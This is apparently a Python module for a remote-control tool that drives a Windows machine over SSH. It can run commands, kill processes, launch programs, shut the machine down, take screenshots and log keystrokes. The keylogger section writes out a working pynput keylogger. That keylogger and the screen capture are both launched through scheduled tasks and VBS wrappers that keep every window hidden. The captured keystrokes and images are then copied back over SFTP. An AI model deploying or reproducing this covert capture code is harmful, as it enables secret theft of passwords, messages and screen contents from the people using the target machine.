"""
ssh_client.py — all paramiko interaction lives here.
main.py must never import paramiko directly.
"""
import io
import os
import time
import tempfile
from typing import Optional

import paramiko

# ── connection ────────────────────────────────────────────────────────────────

def connect(host: str, user: str, key_path: str) -> paramiko.SSHClient:
    """Open and return an authenticated SSH connection."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=host,
        username=user,
        key_filename=key_path,
        timeout=8,
    )
    return client


def is_connected(client: Optional[paramiko.SSHClient]) -> bool:
    """Return True if the SSH session is alive."""
    try:
        if client is None:
            return False
        transport = client.get_transport()
        return transport is not None and transport.is_active()
    except Exception:
        return False


# ── generic command ───────────────────────────────────────────────────────────

def run_command(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> str:
    """
    Run a command on the remote VM and return combined stdout + stderr.
    Uses PowerShell so both CMD and PS syntax work.
    """
    full_cmd = f'powershell -NoProfile -Command "{cmd}"'
    _, stdout, stderr = client.exec_command(full_cmd, timeout=timeout)
    out = stdout.read().decode(errors="replace").strip()
    err = stderr.read().decode(errors="replace").strip()
    return out if out else err


# ── process management ────────────────────────────────────────────────────────

def list_processes(client: paramiko.SSHClient) -> list[dict]:
    """
    Return a list of running processes as dicts with keys:
    name, pid, mem_kb, session
    """
    raw = run_command(client, "tasklist /FO CSV /NH")
    processes = []
    for line in raw.splitlines():
        line = line.strip().strip('"')
        parts = [p.strip('"') for p in line.split('","')]
        if len(parts) >= 5:
            try:
                processes.append({
                    "name":     parts[0],
                    "pid":      int(parts[1]),
                    "session":  parts[2],
                    "mem_kb":   parts[4].replace("\xa0", "").replace(",", "").replace("K", "").strip(),
                })
            except (ValueError, IndexError):
                continue
    return processes


def kill_process(client: paramiko.SSHClient, name: str) -> tuple[bool, str]:
    """Kill a process by image name. Returns (success, message)."""
    result = run_command(client, f"taskkill /IM {name} /F")
    success = "SUCCESS" in result or "success" in result.lower()
    return success, result


def start_process(client: paramiko.SSHClient, exe_path: str) -> tuple[bool, str]:
    """
    Launch an application on the VM's visible desktop.

    Uses a Scheduled Task with LogonType=Interactive so the process
    appears in the user's graphical session (Session 1).
    Direct exec_command would start it in Session 0 — invisible to the user.

    exe_path examples: 'notepad.exe', 'calc.exe',
                       'C:\\Program Files\\...\\app.exe'
    """
    # Escape any single quotes in the path
    safe_path = exe_path.replace("'", "''")
    task_cmd = (
        r"$user = $env:USERNAME; "
        r"$p = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest; "
        f"$a = New-ScheduledTaskAction -Execute '{safe_path}'; "
        r"$t = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(2)); "
        r"$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 5); "
        r"Register-ScheduledTask -TaskName RCLaunch -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null; "
        r"Start-Sleep -Seconds 4; "
        r"Unregister-ScheduledTask -TaskName RCLaunch -Confirm:$false | Out-Null"
    )
    run_command(client, task_cmd, timeout=15)

    # Verify the process appeared
    exe_name = exe_path.replace("\\", "/").split("/")[-1]
    procs = list_processes(client)
    found = any(p["name"].lower() == exe_name.lower() for p in procs)
    if found:
        return True, f"{exe_name} launched successfully."
    return False, f"Launch command sent, but {exe_name} was not found running (it may have exited immediately)."


def shutdown(client: paramiko.SSHClient) -> str:
    """Schedule an immediate shutdown of the VM."""
    return run_command(client, "shutdown /s /t 0")


def restart(client: paramiko.SSHClient) -> str:
    """Schedule an immediate restart of the VM."""
    return run_command(client, "shutdown /r /t 0")


# ── screenshot ────────────────────────────────────────────────────────────────

_SCREENSHOT_REMOTE        = r"C:\Temp\screenshot.png"
_SCREENSHOT_SCRIPT_REMOTE = r"C:\Temp\_screenshot.ps1"

# This script runs on the VM inside the interactive session (Session 1).
# CopyFromScreen MUST run there — SSH is Session 0 (no display).
_SCREENSHOT_SCRIPT = b"""
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp    = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$g      = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save('C:\\Temp\\screenshot.png')
$g.Dispose()
$bmp.Dispose()
"""

_SCREENSHOT_VBS_REMOTE = r"C:\Temp\_screenshot.vbs"

# VBScript wrapper: runs PowerShell with window style 0 (hidden) and True
# (blocking — waits for the PS script to finish before returning).
# wscript.exe itself has no console window, and the Run() call hides the
# PowerShell window, so nothing is visible on the VM desktop during capture.
_SCREENSHOT_VBS = (
    b'CreateObject("WScript.Shell").Run '
    b'"powershell.exe -ExecutionPolicy Bypass -NonInteractive '
    b'-WindowStyle Hidden -File C:\\Temp\\_screenshot.ps1", 0, True\r\n'
)

# Scheduled Task command: runs wscript.exe → VBS → hidden PowerShell.
_SCREENSHOT_TASK_CMD = (
    r"$user = $env:USERNAME; "
    r"$p = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest; "
    r"$a = New-ScheduledTaskAction -Execute 'wscript.exe' "
    r"     -Argument 'C:\Temp\_screenshot.vbs'; "
    r"$t = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(2)); "
    r"$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1); "
    r"Register-ScheduledTask -TaskName RCShot -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null; "
    r"Start-Sleep -Seconds 7; "
    r"Unregister-ScheduledTask -TaskName RCShot -Confirm:$false | Out-Null"
)


def screenshot(client: paramiko.SSHClient) -> bytes:
    """
    Capture the VM screen and return the PNG as bytes.

    Why a Scheduled Task?
    SSH processes run in Windows Session 0 (service/background session)
    which has no graphical desktop. CopyFromScreen returns a blank image
    from Session 0. Running via a Scheduled Task with LogonType=Interactive
    executes in the user's active desktop session (Session 1) where the
    real screen is rendered.
    """
    # 1. Ensure C:\Temp exists
    run_command(client, r"New-Item -ItemType Directory -Force -Path C:\Temp | Out-Null")

    # 2. Upload the capture script and the silent VBS wrapper to the VM
    sftp_upload_bytes(client, _SCREENSHOT_SCRIPT, _SCREENSHOT_SCRIPT_REMOTE)
    sftp_upload_bytes(client, _SCREENSHOT_VBS,    _SCREENSHOT_VBS_REMOTE)

    # 3. Schedule wscript.exe → VBS → hidden PowerShell in interactive session
    run_command(client, _SCREENSHOT_TASK_CMD, timeout=20)

    # 4. Give the file system a moment to flush
    time.sleep(0.5)

    # 5. SFTP the screenshot back
    return sftp_download_bytes(client, _SCREENSHOT_REMOTE)


# ── keylogger ─────────────────────────────────────────────────────────────────

_KEYLOG_REMOTE = r"C:\Temp\keylog.txt"

_KEYLOG_SCRIPT = r"""
import sys, time
from pynput import keyboard

log = []
def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append(f'[{key}]')

listener = keyboard.Listener(on_press=on_press)
listener.start()
time.sleep(int(sys.argv[1]))
listener.stop()

with open(r'C:\Temp\keylog.txt', 'w') as f:
    f.write(''.join(log))
"""

_KEYLOG_SCRIPT_REMOTE = r"C:\Temp\_keylogger.py"


def keylog(client: paramiko.SSHClient, duration_sec: int = 30) -> str:
    """
    Run a timed pynput keylogger on the VM for `duration_sec` seconds.

    Why a Scheduled Task?
    pynput's keyboard.Listener hooks low-level Windows input events, which
    only exist in the interactive user session (Session 1). SSH processes run
    in Session 0 and receive no keyboard events — the log file is blank.
    Running via a Scheduled Task with LogonType=Interactive fixes this.
    """
    run_command(client, r"New-Item -ItemType Directory -Force -Path C:\Temp | Out-Null")
    # Clean slate: remove old log file and any leftover task from a previous run
    run_command(client, r"Remove-Item -Path 'C:\Temp\keylog.txt' -ErrorAction SilentlyContinue")
    run_command(client, r"Unregister-ScheduledTask -TaskName RCKeylog -Confirm:$false -ErrorAction SilentlyContinue")
    sftp_upload_bytes(client, _KEYLOG_SCRIPT.encode(), _KEYLOG_SCRIPT_REMOTE)

    # Resolve full python.exe path — Task Scheduler PATH differs from interactive PATH
    py_path_raw = run_command(
        client,
        r"$p=(Get-Command python -EA SilentlyContinue).Path; "
        r"if(-not $p){$p=(where.exe python 2>$null | Select-Object -First 1)}; $p"
    ).strip().split('\n')[0].strip()
    python_exe = py_path_raw if (py_path_raw and py_path_raw.lower().endswith('.exe')) else "python"

    # Build a VBScript that runs Python silently (no console window):
    #   Run(cmd, window_style=0, wait=True)
    #   window_style 0 = hidden, True = blocking (waits for Python to finish)
    # Chr(34) = " — avoids VBS string quoting issues if python_exe has spaces.
    vbs_content = (
        f'CreateObject("WScript.Shell").Run '
        f'Chr(34) & "{python_exe}" & Chr(34) & '
        f'" C:\\Temp\\_keylogger.py {duration_sec}", 0, True\r\n'
    ).encode()
    sftp_upload_bytes(client, vbs_content, r"C:\Temp\_keylogger.vbs")

    # Task runs wscript.exe (silent, no window) with the VBS.
    # VBS blocks until Python finishes, so the task duration = duration_sec.
    total_wait = duration_sec + 8   # 2s task-start delay + duration + 6s buffer
    task_cmd = (
        r"$user = $env:USERNAME; "
        r"$p = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest; "
        r"$a = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument 'C:\Temp\_keylogger.vbs'; "
        r"$t = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(2)); "
        rf"$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds {duration_sec + 30}); "
        r"Register-ScheduledTask -TaskName RCKeylog -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null; "
        rf"Start-Sleep -Seconds {total_wait}; "
        r"Unregister-ScheduledTask -TaskName RCKeylog -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"
    )
    run_command(client, task_cmd, timeout=total_wait + 15)
    time.sleep(1)

    # Verify the file was actually created before attempting SFTP
    exists = run_command(client, r"Test-Path 'C:\Temp\keylog.txt'").strip().lower()
    if exists != "true":
        raise FileNotFoundError(
            f"keylog.txt was not created on the VM.\n"
            f"Python resolved to: {python_exe}\n"
            f"Test on the VM: \"{python_exe}\" C:\\Temp\\_keylogger.py 5"
        )
    return sftp_download_bytes(client, _KEYLOG_REMOTE).decode(errors="replace")


# ── SFTP helpers ──────────────────────────────────────────────────────────────

def sftp_download_bytes(client: paramiko.SSHClient, remote_path: str) -> bytes:
    """Download a remote file and return its content as bytes."""
    buf = io.BytesIO()
    with client.open_sftp() as sftp:
        sftp.getfo(remote_path, buf)
    return buf.getvalue()


def sftp_upload_bytes(
    client: paramiko.SSHClient, data: bytes, remote_path: str
) -> None:
    """Upload raw bytes to a remote path."""
    buf = io.BytesIO(data)
    with client.open_sftp() as sftp:
        sftp.putfo(buf, remote_path)


def sftp_upload_file(
    client: paramiko.SSHClient, local_path: str, remote_filename: str
) -> None:
    """Upload a local file to C:\\Temp\\<remote_filename> on the VM."""
    remote_path = rf"C:\Temp\{remote_filename}"
    with client.open_sftp() as sftp:
        sftp.put(local_path, remote_path)


def sftp_download_file(
    client: paramiko.SSHClient, remote_filename: str, local_path: str
) -> None:
    """Download C:\\Temp\\<remote_filename> from the VM to local_path."""
    remote_path = rf"C:\Temp\{remote_filename}"
    with client.open_sftp() as sftp:
        sftp.get(remote_path, local_path)
